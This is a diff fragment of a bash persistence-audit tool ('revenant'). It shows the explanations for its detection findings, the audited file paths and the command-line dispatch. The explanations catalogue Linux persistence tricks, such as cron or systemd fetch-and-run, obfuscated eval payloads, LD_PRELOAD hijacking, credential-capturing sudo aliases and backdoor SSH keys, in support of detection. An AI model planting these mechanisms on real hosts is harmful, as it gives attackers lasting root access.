+      printf '  attack:  T1053.003 (Cron)\n'
+      printf '  why:     /tmp, /var/tmp and /dev/shm are world-writable and wiped on reboot.\n'
+      printf '           legitimate software almost never schedules from there; malware does it\n'
+      printf '           to avoid leaving a binary next to the crontab that points at it.\n'
+      printf '  fix:     quarantine the staged payload, remove the entry, audit who wrote it.\n' ;;
+    RVT-CRON-003)
+      printf 'RVT-CRON-003 -- obfuscated payload in a scheduled task\n'
+      printf '  attack:  T1053.003 (Cron), T1027 (Obfuscated Files or Information)\n'
+      printf '  why:     base64 -d, eval and \\x blobs inside cron lines exist to survive\n'
+      printf '           casual eyeballing and naive grep. legitimate admins do not ship\n'
+      printf '           obfuscated one-liners in cron.d.\n'
+      printf '  fix:     decode offline in a sandbox, then treat the decoded result as the\n'
+      printf '           real indicator set.\n' ;;
+    RVT-CRON-004)
+      printf 'RVT-CRON-004 -- hidden cron file name\n'
+      printf '  attack:  T1053.003 (Cron), T1036 (Masquerading)\n'
+      printf '  why:     dot-prefixed files in cron directories are invisible to a plain ls.\n'
+      printf '           some parsers skip them entirely. that is the point.\n'
+      printf '  fix:     read the file, decide, remove if unexplained.\n' ;;
+    RVT-CRON-005)
+      printf 'RVT-CRON-005 -- writable cron artifact\n'
+      printf '  attack:  T1053.003 (Cron), T1574.007 (PATH Interception)\n'
+      printf '  why:     a world-writable crontab or a world-writable script referenced by\n'
+      printf '           cron lets any local user schedule or redirect execution as root.\n'
+      printf '  fix:     chmod 0644 / 0755, verify owner, check for recent mtime drift.\n' ;;
+    RVT-AT-001)
+      printf 'RVT-AT-001 -- at job queued\n'
+      printf '  attack:  T1053.002 (At)\n'
+      printf '  why:     at jobs are one-shot scheduled tasks most teams forget exist. a queued\n'
+      printf '           job is a time bomb that survives short-lived compromise.\n'
+      printf '  fix:     atrm the job after reading it; list all users spooling at jobs.\n' ;;
+    RVT-AT-002)
+      printf 'RVT-AT-002 -- at job performs network fetch or volatile execution\n'
+      printf '  attack:  T1053.002 (At)\n'
+      printf '  why:     same logic as cron, but rarer and therefore less monitored.\n'
+      printf '  fix:     capture the job body as evidence before atrm.\n' ;;
+    RVT-SVC-001)
+      printf 'RVT-SVC-001 -- unit executes from a volatile path\n'
+      printf '  attack:  T1543.002 (Systemd Service)\n'
+      printf '  why:     services running from /tmp or /dev/shm execute as root at boot with\n'
+      printf '           zero persistence footprint outside the unit file itself.\n'
+      printf '  fix:     stop and disable the unit, capture the binary it referenced.\n' ;;
+    RVT-SVC-002)
+      printf 'RVT-SVC-002 -- unit fetches and pipes into a shell\n'
+      printf '  attack:  T1543.002 (Systemd Service), T1059 (Command and Scripting Interpreter)\n'
+      printf '  why:     ExecStartPre pulling a payload is the download-and-run pattern baked\n'
+      printf '           into a privileged boot artifact. it re-arms on every boot.\n'
+      printf '  fix:     disable unit, capture URL as IOC, rotate credentials, block URL.\n' ;;
+    RVT-SVC-003)
+      printf 'RVT-SVC-003 -- obfuscated command in unit\n'
+      printf '  attack:  T1543.002 (Systemd Service), T1027 (Obfuscated Files or Information)\n'
+      printf '  why:     decode-first-then-run in a unit file hides the true payload from\n'
+      printf '           triage and from most signature scanners.\n'
+      printf '  fix:     decode offline, quarantine unit, audit systemd drop-in history.\n' ;;
+    RVT-SVC-004)
+      printf 'RVT-SVC-004 -- unit without sandboxing directives\n'
+      printf '  attack:  defense-in-depth gap (TA0005 adjacent)\n'
+      printf '  why:     units you wrote yourself in /etc or a user unit with no NoNewPrivileges\n'
+      printf '           or ProtectSystem turn any vulnerability in that service into root.\n'
+      printf '  fix:     add NoNewPrivileges=true, ProtectSystem=strict, PrivateTmp=true,\n'
+      printf '           then run systemd-analyze security <unit>.\n' ;;
+    RVT-SVC-005)
+      printf 'RVT-SVC-005 -- wants/requires symlink outside unit directories\n'
+      printf '  attack:  T1543.002 (Systemd Service)\n'
+      printf '  why:     enablement symlinks that leave the unit trees boot code systemd was\n'
+      printf '           never meant to start. common trick to make an edit survive package\n'
+      printf '           manager reconciliation.\n'
+      printf '  fix:     readlink the target, decide, remove the symlink.\n' ;;
+    RVT-TIM-001)
+      printf 'RVT-TIM-001 -- timer fires on a tight cadence\n'
+      printf '  attack:  T1053.006 (Systemd Timers)\n'
+      printf '  why:     per-minute timers are usually beacon scheduling. by themselves they\n'
+      printf '           are weak signals; combined with other flags they close the case.\n'
+      printf '  fix:     correlate with what the timer starts.\n' ;;
+    RVT-SHL-001)
+      printf 'RVT-SHL-001 -- dynamic linker override exported in init file\n'
+      printf '  attack:  T1574.006 (Dynamic Linker Hijacking), T1546.004 (Unix Shell Configuration)\n'
+      printf '  why:     LD_PRELOAD exported in a shell rc means every program launched from\n'
+      printf '           that shell loads attacker code first. rootkits love this.\n'
+      printf '  fix:     remove the export, hunt the .so it pointed at, check ld.so.preload.\n' ;;
+    RVT-SHL-002)
+      printf 'RVT-SHL-002 -- alias intercepts a sensitive command\n'
+      printf '  attack:  T1546.004 (Unix Shell Configuration Modification)\n'
+      printf '  why:     alias sudo=... with injected env or a wrapper captures credentials\n'
+      printf '           or downgrades privilege checks for every interactive session.\n'
+      printf '  fix:     remove the alias, diff the rc file against a package-owned copy.\n' ;;
+    RVT-SHL-003)
+      printf 'RVT-SHL-003 -- obfuscated code in init file\n'
+      printf '  attack:  T1546.004 (Unix Shell Configuration Modification)\n'
+      printf '  why:     eval/base64 in profile or bashrc runs on every login for every user\n'
+      printf '           it touches. it is the persistence that survives reboots and relogins.\n'
+      printf '  fix:     decode, quarantine, restore the file from a known-good copy.\n' ;;
+    RVT-SHL-004)
+      printf 'RVT-SHL-004 -- PATH entry world-writable\n'
+      printf '  attack:  T1574.007 (PATH Interception)\n'
+      printf '  why:     any local user can plant a trojan horse for a common binary name in\n'
+      printf '           a world-writable directory that PATH resolves before /usr/bin.\n'
+      printf '  fix:     chmod 0755 the directory, re-order PATH, hunt for planted binaries.\n' ;;
+    RVT-SHL-005)
+      printf 'RVT-SHL-005 -- invisible unicode in init script\n'
+      printf '  attack:  T1546.004 (Unix Shell Configuration Modification), T1036\n'
+      printf '  why:     zero-width and bidi control characters can smuggle commands past\n'
+      printf '           review tools and even alter how the same bytes render to two\n'
+      printf '           different readers (Trojan Source class attacks).\n'
+      printf '  fix:     hexdump the file, locate the byte ranges, rewrite the file clean.\n' ;;
+    RVT-SSH-001)
+      printf 'RVT-SSH-001 -- authorized key forces a command\n'
+      printf '  attack:  T1098.004 (SSH Authorized Keys)\n'
+      printf '  why:     command="..." keys are legitimate for backups, but they are also the\n'
+      printf '           standard shape of a restricted backdoor: key in, one command out.\n'
+      printf '  fix:     verify the forced command against its owner, remove if unexplained.\n' ;;
+    RVT-SSH-002)
+      printf 'RVT-SSH-002 -- .ssh location world-writable\n'
+      printf '  attack:  T1098.004 (SSH Authorized Keys)\n'
+      printf '  why:     a writable authorized_keys means any local user can add their own key\n'
+      printf '           and inherit that account on next login.\n'
+      printf '  fix:     chmod 0700 ~/.ssh, 0600 authorized_keys, audit keys against owners.\n' ;;
+    RVT-SSH-003)
+      printf 'RVT-SSH-003 -- forced command from volatile path\n'
+      printf '  attack:  T1098.004 (SSH Authorized Keys)\n'
+      printf '  why:     a key whose command lives in /tmp or /dev/shm is not a backup key.\n'
+      printf '           it is a loader that runs on first inbound connection.\n'
+      printf '  fix:     remove the key line, capture the payload path as an IOC.\n' ;;
+    RVT-SSH-004)
+      printf 'RVT-SSH-004 -- sshd allows direct root login\n'
+      printf '  attack:  posture gap (TA0001 adjacent)\n'
+      printf '  why:     PermitRootLogin yes turns any stolen root credential or key into a\n'
+      printf '           persistent channel with no account stepping stones to notice.\n'
+      printf '  fix:     set PermitRootLogin no or prohibit-password, reload sshd.\n' ;;
+    RVT-USR-001)
+      printf 'RVT-USR-001 -- non-root account with UID 0\n'
+      printf '  attack:  T1136.001 (Create Account: Local Account), T1564 (Hidden Assets)\n'
+      printf '  why:     a second UID 0 account is root wearing a different name: it defeats\n'
+      printf '           audit rules keying on "root" and survives password changes to root.\n'
+      printf '  fix:     lock and investigate immediately; verify against provisioning records.\n' ;;
+    RVT-USR-002)
+      printf 'RVT-USR-002 -- duplicate UID on accounts\n'
+      printf '  attack:  T1136.001 (Create Account: Local Account)\n'
+      printf '  why:     two names sharing a UID means one identity auditing as another.\n'
+      printf '  fix:     renumber one account, review its history.\n' ;;
+    RVT-SUDO-001)
+      printf 'RVT-SUDO-001 -- passwordless sudo rule\n'
+      printf '  attack:  T1548.003 (Sudo and Sudo Caching)\n'
+      printf '  why:     NOPASSWD removes the one prompt that would surface a compromised\n'
+      printf '           account escalating. common in CI images, rare and deliberate on\n'
+      printf '           long-lived servers.\n'
+      printf '  fix:     scope the rule to exact commands, add authenticate where feasible.\n' ;;
+    RVT-SUDO-002)
+      printf 'RVT-SUDO-002 -- nonstandard or writable sudoers include\n'
+      printf '  attack:  T1548.003 (Sudo and Sudo Caching)\n'
+      printf '  why:     an includedir outside /etc/sudoers.d, or a sudoers artifact that any\n'
+      printf '           user can write, means privilege grants are no longer yours to audit.\n'
+      printf '  fix:     restore standard includes, chmod 0440, verify ownership.\n' ;;
+    RVT-PRX-001)
+      printf 'RVT-PRX-001 -- ld.so.preload populated\n'
+      printf '  attack:  T1574.006 (Dynamic Linker Hijacking)\n'
+      printf '  why:     /etc/ld.so.preload injects a shared object into every dynamically\n'
+      printf '           linked process on the box. this is rootkit mechanism number one.\n'
+      printf '           an empty file is the normal state on almost every system.\n'
+      printf '  fix:     capture the .so offline, remove the line, re-image if unclear.\n' ;;
+    RVT-PRX-002)
+      printf 'RVT-PRX-002 -- linker search path in volatile location\n'
+      printf '  attack:  T1574.006 (Dynamic Linker Hijacking)\n'
+      printf '  why:     ld.so.conf.d pointing at /tmp or /dev/shm lets attacker-named .so\n'
+      printf '           files satisfy library lookups for privileged processes.\n'
+      printf '  fix:     remove the conf entry, run ldconfig, hunt matching .so names.\n' ;;
+    RVT-PTH-001)
+      printf 'RVT-PTH-001 -- directory on PATH is world-writable\n'
+      printf '  attack:  T1574.007 (PATH Interception)\n'
+      printf '  why:     same class as RVT-SHL-004 but host-wide: affects every user,\n'
+      printf '           every script, every cron job that does not use absolute paths.\n'
+      printf '  fix:     chmod 0755 the directory, enumerate what lives in it.\n' ;;
+    RVT-BOOT-001)
+      printf 'RVT-BOOT-001 -- rc.local present and executable\n'
+      printf '  attack:  T1037 (Boot or Logon Initialization Scripts)\n'
+      printf '  why:     rc.local is legacy but still honored. on servers it usually sits\n'
+      printf '           empty; an executable one with content deserves a look.\n'
+      printf '  fix:     read it end to end.\n' ;;
+    RVT-BOOT-002)
+      printf 'RVT-BOOT-002 -- boot script performs network fetch or volatile execution\n'
+      printf '  attack:  T1037 (Boot or Logon Initialization Scripts)\n'
+      printf '  why:     rc.local and init.d run as root at boot before any EDR agents settle.\n'
+      printf '           fetch-and-run there is the cleanest persistence there is.\n'
+      printf '  fix:     capture content, remove, block the URL, hunt the writer.\n' ;;
+    RVT-BOOT-003)
+      printf 'RVT-BOOT-003 -- boot-time symlink targets outside init.d\n'
+      printf '  attack:  T1037 (Boot or Logon Initialization Scripts)\n'
+      printf '  why:     rcN.d entries are supposed to point at /etc/init.d. anything else\n'
+      printf '           boots code outside the package-managed service estate.\n'
+      printf '  fix:     readlink, decide, remove, verify runlevel restoration.\n' ;;
+    RVT-UDEV-001)
+      printf 'RVT-UDEV-001 -- udev rule executes from volatile path or fetches\n'
+      printf '  attack:  T1546.017 (Udev Rules)\n'
+      printf '  why:     udev rules fire as root on device events, including at boot. rules\n'
+      printf '           referencing /tmp payloads trigger on the next hotplug or reboot.\n'
+      printf '  fix:     remove the rule, capture the payload path, correlate insertion times.\n' ;;
+    RVT-XDG-001)
+      printf 'RVT-XDG-001 -- autostart entry executes from volatile path or obfuscated\n'
+      printf '  attack:  T1547.013 (XDG Autostart)\n'
+      printf '  why:     desktop autostart entries run when any user logs into a session.\n'
+      printf '           on servers they are dead weight; on workstations they are the\n'
+      printf '           persistence of choice for user-level malware.\n'
+      printf '  fix:     remove the .desktop entry, hunt the executable it named.\n' ;;
+    RVT-XDG-002)
+      printf 'RVT-XDG-002 -- autostart entry fetches and pipes into a shell\n'
+      printf '  attack:  T1547.013 (XDG Autostart)\n'
+      printf '  why:     a .desktop Exec line pulling a remote script is download-and-run on\n'
+      printf '           every login.\n'
+      printf '  fix:     remove entry, block URL, rotate credentials of that user.\n' ;;
+    RVT-MOTD-001)
+      printf 'RVT-MOTD-001 -- dynamic motd script performs network fetch or volatile execution\n'
+      printf '  attack:  T1037 (Boot or Logon Initialization Scripts)\n'
+      printf '  why:     update-motd.d scripts run as root on every SSH login. an administrator\n'
+      printf '           logging in is the trigger; the fetch hides behind a benign banner.\n'
+      printf '  fix:     remove the script, capture content, audit who installed it.\n' ;;
+    *)
+      rv_die "unknown finding id: $fid (try: revenant paths)" ;;
+  esac
+  return 0
+}
+
+# ------------------------------------------------------------------ paths
+cmd_paths() {
+  printf 'audit locations (under root %s)\n\n' "${RVT_ROOT:-/}"
+  printf '  cron      /etc/crontab  /etc/cron.d  /var/spool/cron/{crontabs,tabs}\n'
+  printf '  at        /var/spool/cron/atjobs  /var/spool/at\n'
+  printf '  systemd   /etc/systemd/system  /usr/lib/systemd/system  /lib/systemd/system\n'
+  printf '            user: /home/*/.config/systemd/user  /root/.config/systemd/user\n'
+  printf '  shell     /etc/profile  /etc/bash.bashrc  /etc/profile.d  /etc/zsh/*\n'
+  printf '            users: .bashrc .bash_profile .profile .zshenv .zprofile .zshrc .zlogin\n'
+  printf '  ssh       /home/*/.ssh/authorized_keys{,2}  /root/.ssh  /etc/ssh/sshd_config\n'
+  printf '  accounts  /etc/passwd\n'
+  printf '  sudo      /etc/sudoers  /etc/sudoers.d\n'
+  printf '  linker    /etc/ld.so.preload  /etc/ld.so.conf.d  $PATH (host only)\n'
+  printf '  boot      /etc/rc.local  /etc/init.d  /etc/rc*.d (symlink targets)\n'
+  printf '  triggers  /etc/udev/rules.d  /etc/xdg/autostart  ~/.config/autostart\n'
+  printf '            /etc/update-motd.d\n'
+  printf '\nfinding ids: RVT-<MECH>-<NNN> -- see revenant explain <id>\n'
+  return 0
+}
+
+# ------------------------------------------------------------------ main dispatch
+usage() {
+  cat <<'EOF'
+revenant - persistence audit for unix hosts. pure bash. nothing leaves the machine.
+
+usage:
+  revenant scan [--root DIR] [--json|--md] [--no-color] [--fail-on LEVEL]
+  revenant report [--root DIR] [--out DIR]
+  revenant baseline --save FILE [--root DIR]
+  revenant check --base FILE [--root DIR]
+  revenant forge [--out DIR] [--profile dirty|clean]
+  revenant explain <RVT-ID>
+  revenant paths
+  revenant version
+
+levels: low | elevated | high | critical
+exit codes (scan): 0 clean, 1 low, 2 elevated, 3 high, 10 critical
+EOF
+}
+
+main() {
+  [ $# -ge 1 ] || { usage >&2; exit 64; }
+  local cmd="$1"; shift
+  case "$cmd" in
+    version) printf 'revenant %s\n' "$RVT_VERSION"; exit 0 ;;
+    help|-h|--help) usage; exit 0 ;;
+  esac
+
+  local opt_root="" opt_fmt="terminal" opt_fail_on="" opt_out="" opt_save="" opt_base=""
+  local opt_pos=()
+  if [ "$cmd" = "forge" ]; then
+    cmd_forge "$@"
+    exit 0
+  fi
+  while [ $# -gt 0 ]; do
+    case "$1" in
+      --root) opt_root="$2"; shift 2 ;;
+      --json) opt_fmt="json"; shift ;;
+      --md) opt_fmt="md"; shift ;;
+      --no-color) RVT_COLOR="0"; shift ;;
+      --fail-on) opt_fail_on="$2"; shift 2 ;;
+      --out) opt_out="$2"; shift 2 ;;
+      --save) opt_save="$2"; shift 2 ;;
+      --base) opt_base="$2"; shift 2 ;;
+      -*) rv_die "unknown option: $1" ;;
+      *) opt_pos=(${opt_pos[@]+"${opt_pos[@]}"} "$1"); shift ;;
+    esac
+  done
+  if [ -n "$opt_root" ]; then
+    [ -d "$opt_root" ] || rv_die "root is not a directory: $opt_root"
+    RVT_ROOT=${opt_root%/}
+  fi
+
+  case "$cmd" in
+    scan)
+      rv_scan_all
+      case "$opt_fmt" in
+        json) render_json ;;
+        md) render_md ;;
+        *) render_terminal ;;
+      esac
+      local v code
+      v=$(verdict_calc)
+      code=$(verdict_code "$v")
+      if [ -n "$opt_fail_on" ]; then
+        case "$opt_fail_on" in
+          low)      [ "$code" -ge 1 ] && exit 10 || exit 0 ;;
+          elevated) [ "$code" -ge 2 ] && exit 10 || exit 0 ;;
+          high)     [ "$code" -ge 3 ] && exit 10 || exit 0 ;;
+          critical) [ "$code" -ge 10 ] && exit 10 || exit 0 ;;
+          *) rv_die "unknown level: $opt_fail_on" ;;
+        esac
+      fi
+      exit "$code"
+      ;;
+    report)
+      [ -n "$opt_out" ] || opt_out="./revenant-out"
+      mkdir -p "$opt_out"
+      rv_scan_all
+      render_json > "$opt_out/report.json"
+      render_md > "$opt_out/report.md"
+      render_terminal
+      printf '\nreports written: %s/report.json %s/report.md\n' "$opt_out" "$opt_out"
+      local v code
+      v=$(verdict_calc); code=$(verdict_code "$v"); exit "$code"
+      ;;
+    baseline)
+      [ -n "$opt_save" ] || rv_die "baseline requires --save FILE"
+      cmd_baseline_save "$opt_save"; exit 0 ;;
+    check)
+      [ -n "$opt_base" ] || rv_die "check requires --base FILE"
+      cmd_baseline_check "$opt_base"; exit $? ;;
+    explain)
+      local fid="${opt_pos[0]:-}"  # safe: set only when a positional arrived
+      [ -n "$fid" ] || rv_die "explain requires a finding id"
+      cmd_explain "$fid"; exit 0 ;;
+    paths)
+      cmd_paths; exit 0 ;;
+    *)
+      usage >&2
+      exit 64 ;;
+  esac
+}
+
+if [ "${RVT_LIB_ONLY:-0}" != "1" ]; then
+  main "$@"
+fi
